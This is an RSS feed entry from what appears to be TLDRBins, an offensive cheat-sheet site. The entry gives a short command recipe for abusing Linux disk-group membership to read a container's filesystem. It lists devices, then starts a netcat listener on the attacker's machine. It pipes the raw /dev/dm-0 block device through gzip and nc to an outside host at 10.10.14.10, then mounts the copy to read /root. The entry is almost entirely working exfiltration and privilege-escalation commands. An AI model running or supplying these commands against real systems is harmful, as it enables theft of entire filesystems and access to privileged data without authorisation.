channel.title: Disk on TLDRBins
channel.description: Recent content in Disk on TLDRBins

item.title: disk
item.description: Abuse disk group to read container’s filesystem # Show devices lsblk # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 > dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.10 4444 # Extract dm-0 gunzip dm-0.gz # Mount the filesystem sudo mount dm-0-orig /mnt/ # Privilege read ls /mnt/root/ Note: can take a long time to transfer
